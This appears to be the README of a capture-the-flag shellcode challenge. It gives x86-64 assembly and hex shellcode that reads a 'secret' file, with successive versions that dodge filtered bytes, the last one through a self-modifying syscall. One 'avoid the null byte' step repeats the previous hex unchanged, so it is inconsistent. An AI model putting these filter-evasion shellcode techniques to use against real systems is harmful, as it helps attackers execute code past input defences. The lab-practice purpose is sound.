# shooow your shell

Needs to be run as root (due to schitzo)

Some shellcode to test with:

```
xor eax, eax; mov al, 2; xor esi, esi; lea rdi, [rip+flag]; syscall; xor eax, eax; xor edi, edi; mov dil, 3; push rsp; pop rsi; xor edx, edx; mov dl, 32; syscall; xor eax, eax; mov al, 1; mov dil, 1; syscall; flag: .string "secret";
```

assembles to: `31c0b00231f6488d3d1a0000000f0531c031ff40b703545e31d2b2200f0531c0b00140b7010f0573656372657400`

then, we can shorten to (because the last null is already there from mmap): `31c0b00231f6488d3d1a0000000f0531c031ff40b703545e31d2b2200f0531c0b00140b7010f05736563726574`

then, we can avoid the 0x48:

```
xor eax, eax; mov al, 2; xor esi, esi; jmp omg; resume: pop rdi; syscall; xor eax, eax; xor edi, edi; mov dil, 3; push rsp; pop rsi; xor edx, edx; mov dl, 32; syscall; xor eax, eax; mov al, 1; mov dil, 1; syscall; xor eax, eax; mov al, 60; syscall; omg: call resume; flag: .string "secret";
```
assembles to: `31c0b00231f6eb215f0f0531c031ff40b703545e31d2b2200f0531c0b00140b7010f0531c0b03c0f05e8daffffff73656372657400`

then, we can avoid the null byte (because it's provided by the mmap anyways): `31c0b00231f6eb215f0f0531c031ff40b703545e31d2b2200f0531c0b00140b7010f0531c0b03c0f05e8daffffff73656372657400`

then, we can avoid the 0f:

```
inc byte ptr [rip+the_syscall]; xor eax, eax; mov al, 2; xor esi, esi; lea rdi, [rip+flag]; call the_syscall; xor eax, eax; xor edi, edi; mov dil, 3; push rsp; pop rsi; xor edx, edx; mov dl, 32; call the_syscall; xor eax, eax; mov al, 1; mov dil, 1; the_syscall: .byte 0x0e; .byte 0x05; ret; flag: .string "secret"
```
assembles to: fe052b00000031c0b00231f6488d3d21000000e81900000031c031ff40b703545e31d2b220e80700000031c0b00140b7010e05c373656372657400


# tricks

- read in from stderr (same socket as stdout)
- decoy bytes in final shellcode
